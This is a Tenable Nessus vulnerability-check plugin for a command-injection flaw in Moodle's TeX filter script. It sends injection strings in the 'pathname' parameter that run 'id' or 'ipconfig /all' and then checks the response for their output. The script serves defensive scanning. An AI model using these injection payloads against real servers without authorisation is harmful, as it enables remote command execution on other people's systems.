#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35090);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(32801);
  script_xref(name:"OSVDB", value:"50810");

  script_name(english:"Moodle filter/tex/texed.php pathname Parameter Remote Command Execution");
  script_summary(english:"Tries to run a command using Moodle");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The version of Moodle installed on the remote host fails to sanitize
user-supplied input to the 'pathname' parameter before using it in the
'filter/tex/texed.php' script in a commandline that is passed to the
shell.  Provided PHP's 'register_globals' setting and the TeX Notation
filter has both been enabled and PHP's 'magic_quotes_gpc' setting is
disabled, an unauthenticated attacker can leverage these issues to
execute arbitrary code on the remote host subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/499172/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals'." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os)
  {
    cmd = 'ipconfig /all';
    exploit = string('nessus" || ', cmd, ' || echo ');
  }
  else
  {
    cmd = 'id';
    exploit = string('nessus";', cmd, ';echo "');
  }
  exploits = make_list(exploit);
}
else exploits = make_list(
  'nessus";id;echo "',
  'nessus" || ipconfig /all || echo '
);
cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig'] = "Subnet Mask";


# test an install.
install = get_kb_item(string("www/", port, "/moodle"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # try to run a command.
  foreach exploit (exploits)
  {
    url = string(
      dir, "/filter/tex/texed.php?",
      "formdata=", SCRIPT_NAME, "&",
      "pathname=", urlencode(str:exploit)
    );

    req = http_mk_get_req(port:port, item:url);
    res = http_send_recv_req(port:port, req:req);
    if (res == null) exit(0);

    # There's a problem if we see the expected command output.
    if ('ipconfig' >< exploit) pat = cmd_pats['ipconfig'];
    else pat = cmd_pats['id'];

    if (egrep(pattern:pat, string:res[2]))
    {
      if (report_verbosity)
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
            "host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
        if (report_verbosity > 1)
        {
          output = res[2];
          output = output - strstr(output, 'Image not found!');
          if ('&pathname' >< output) 
            output = output - strstr(output, string(' -- ', SCRIPT_NAME));

          report = string(
            report,
            "\n",
            "It produced the following output :\n",
            "\n",
            "  ", output, "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
